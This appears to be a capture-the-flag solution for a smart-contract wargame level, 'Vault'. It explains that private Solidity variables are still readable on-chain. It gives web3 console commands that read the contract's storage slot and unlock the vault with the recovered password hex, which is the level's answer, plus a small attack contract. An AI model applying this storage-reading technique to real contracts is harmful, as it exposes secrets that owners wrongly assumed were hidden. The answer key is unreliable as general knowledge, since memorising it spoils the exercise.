/* Vault
Level completed!
Difficulty 3/10

Unlock the vault to pass the level!

It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.

Sources */

// Solution
/* 
1. await web3.eth.getStorageAt(contract.address, 1, (e, v) => console.log(web3.utils.toAscii(v)));

The hexadecmal is generated from above and is implicitly  converted to byte32 by the unlock method
2. contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
 */

 contract VaultAttack {
  function attack(address _target, bytes32 _password) public {
    Vault vault = Vault(_target);
    vault.unlock(_password);
  }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
